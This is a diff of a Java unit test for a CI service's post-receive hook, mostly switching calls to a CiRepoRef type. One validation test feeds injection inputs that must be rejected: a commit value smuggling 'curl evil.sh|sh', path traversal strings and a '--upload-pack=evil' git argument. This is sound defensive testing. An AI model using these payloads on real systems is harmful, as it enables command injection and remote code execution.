@@ -69,7 +69,8 @@ public class CiRunServiceTest extends CiTestSupport {
    * commit built twice.
    */
   private void announcePush(String repoId, String branch, String sha) {
-    service.onPostReceive(repoId, branch, "0".repeat(40), sha, UUID.randomUUID().toString());
+    service.onPostReceive(
+        CiRepoRef.of(repoId), branch, "0".repeat(40), sha, UUID.randomUUID().toString());
   }
 
   private CiRun soleRun() {
@@ -698,19 +699,39 @@ public class CiRunServiceTest extends CiTestSupport {
     String event = UUID.randomUUID().toString();
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive(good, "main", null, "HEAD\nset +e\ncurl evil.sh|sh #", event));
+        () ->
+            service.onPostReceive(
+                CiRepoRef.of(good), "main", null, "HEAD\nset +e\ncurl evil.sh|sh #", event));
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive("../../etc", "main", null, "cafebabe0000000", event));
+        () ->
+            service.onPostReceive(
+                CiRepoRef.of("../../etc"), "main", null, "cafebabe0000000", event));
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive(good, "--upload-pack=evil", null, "cafebabe0000000", event));
+        () ->
+            service.onPostReceive(
+                CiRepoRef.of(good), "--upload-pack=evil", null, "cafebabe0000000", event));
+    // The name half is checked too — but ONLY when it is there, which is the whole compatibility
+    // arm: an id-addressed push announces no pair and must still be accepted (every other case in
+    // this method passes one with no names at all).
+    assertThrows(
+        BadRequestException.class,
+        () ->
+            service.onPostReceive(
+                CiRepoRef.of(good, "../../etc", "qits-ci"), "main", null, "cafebabe0000000", event));
+    assertThrows(
+        BadRequestException.class,
+        () ->
+            service.onPostReceive(
+                CiRepoRef.of(good, "qits", "../evil"), "main", null, "cafebabe0000000", event));
   }
 
   @Test
   public void onPostReceiveExecutesAsynchronously() throws Exception {
     seedConfig(CONFIG_TWO_STEPS);
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha, UUID.randomUUID().toString());
+    service.onPostReceive(
+        CiRepoRef.of(repoId), "main", "0".repeat(40), sha, UUID.randomUUID().toString());
     service.awaitIdle();
     assertEquals(CiRunStatus.SUCCESS, soleRun().status);
   }
@@ -722,7 +743,7 @@ public class CiRunServiceTest extends CiTestSupport {
     // is written. What the publish does with it is asserted in CiEventTriggerCausationTest.
     seedConfig(CONFIG_TWO_STEPS);
     String eventId = UUID.randomUUID().toString();
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
+    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
     service.awaitIdle();
 
     CiRun run = soleRun();
@@ -738,8 +759,8 @@ public class CiRunServiceTest extends CiTestSupport {
     // forever over a run that already exists.
     seedConfig(CONFIG_TWO_STEPS);
     String eventId = UUID.randomUUID().toString();
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
+    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
+    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
     service.awaitIdle();
 
     assertEquals(1, service.runsFor(repoId).size(), "one announcement, one run");
